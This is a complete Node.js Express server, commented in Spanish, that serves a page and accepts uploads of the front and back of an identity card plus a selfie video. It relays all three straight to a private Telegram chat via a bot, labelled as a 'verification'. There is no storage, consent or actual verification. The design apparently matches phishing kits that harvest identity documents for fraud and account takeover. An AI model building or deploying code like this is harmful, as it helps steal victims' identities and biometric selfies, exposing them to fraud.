const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const path = require('path');

// --- Configuración de Seguridad ---
// Estas variables se leen del entorno (Render / hosting)
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const TELEGRAM_API_BASE_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;
const SEND_PHOTO_URL = `${TELEGRAM_API_BASE_URL}/sendPhoto`;
const SEND_VIDEO_URL = `${TELEGRAM_API_BASE_URL}/sendVideo`;

const app = express();
const port = process.env.PORT || 3000;

// Configuración de Multer para recibir 3 archivos EN MEMORIA
const storage = multer.memoryStorage();
const upload = multer({
    storage: storage,
    limits: { fileSize: 50 * 1024 * 1024 } // 50MB por archivo
});

// --- Servir los archivos del Frontend ---
app.use(express.static(path.join(__dirname, 'public')));

// --- Endpoint de subida ---
app.post(
    '/api/enviar-a-telegram',
    upload.fields([
        { name: 'idFront', maxCount: 1 },
        { name: 'idBack', maxCount: 1 },
        { name: 'video', maxCount: 1 }
    ]),
    async (req, res) => {
        console.log("Recibiendo archivos...");

        // 1. Validar que TODOS los archivos existan
        if (!req.files || !req.files.idFront || !req.files.idBack || !req.files.video) {
            console.error("Error: No se recibieron los 3 archivos esperados.");
            return res.status(400).send({ error: 'Faltan archivos (se esperan 3).' });
        }

        // 2. Validar que las variables de entorno estén cargadas
        if (!BOT_TOKEN || !CHAT_ID) {
            console.error("Error 500: Las variables de Telegram no están configuradas en el servidor.");
            return res.status(500).send({ error: 'Error de configuración interna del servidor.' });
        }

        try {
            const idFrontFile = req.files.idFront[0];
            const idBackFile = req.files.idBack[0];
            const videoFile = req.files.video[0];

            console.log('Tamaños recibidos:',
                {
                    front: idFrontFile.size,
                    back: idBackFile.size,
                    video: videoFile.size
                }
            );

            const caption = `Nueva verificación recibida.`;

            // 3. Enviar Foto Frontal
            console.log("Enviando foto frontal...");
            const formFront = new FormData();
            formFront.append('chat_id', CHAT_ID);
            formFront.append('caption', `[FRENTE] ${caption}`);
            formFront.append('photo', idFrontFile.buffer, { filename: 'id_front.jpg' });

            await axios.post(SEND_PHOTO_URL, formFront, {
                headers: formFront.getHeaders()
            });

            // 4. Enviar Foto Trasera
            console.log("Enviando foto trasera...");
            const formBack = new FormData();
            formBack.append('chat_id', CHAT_ID);
            formBack.append('caption', `[TRASERO] ${caption}`);
            formBack.append('photo', idBackFile.buffer, { filename: 'id_back.jpg' });

            await axios.post(SEND_PHOTO_URL, formBack, {
                headers: formBack.getHeaders()
            });

            // 5. Enviar Video Selfie
            console.log("Enviando video selfie...");
            const formVideo = new FormData();
            formVideo.append('chat_id', CHAT_ID);
            formVideo.append('caption', `[VIDEO SELFIE] ${caption}`);
            formVideo.append('video', videoFile.buffer, { filename: 'selfie.webm' });

            await axios.post(SEND_VIDEO_URL, formVideo, {
                headers: formVideo.getHeaders()
            });

            console.log("¡Todos los archivos enviados a Telegram con éxito!");
            res.status(200).send({ success: true, message: 'Archivos enviados.' });
        } catch (error) {
            console.error(
                "Error al enviar archivos a Telegram:",
                error.response ? error.response.data : error.message
            );
            res.status(500).send({ error: 'Error interno al procesar los archivos.' });
        }
    }
);

// Ruta principal para servir el index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Iniciar el servidor
app.listen(port, () => {
    console.log(`Servidor escuchando en el puerto ${port}`);
});
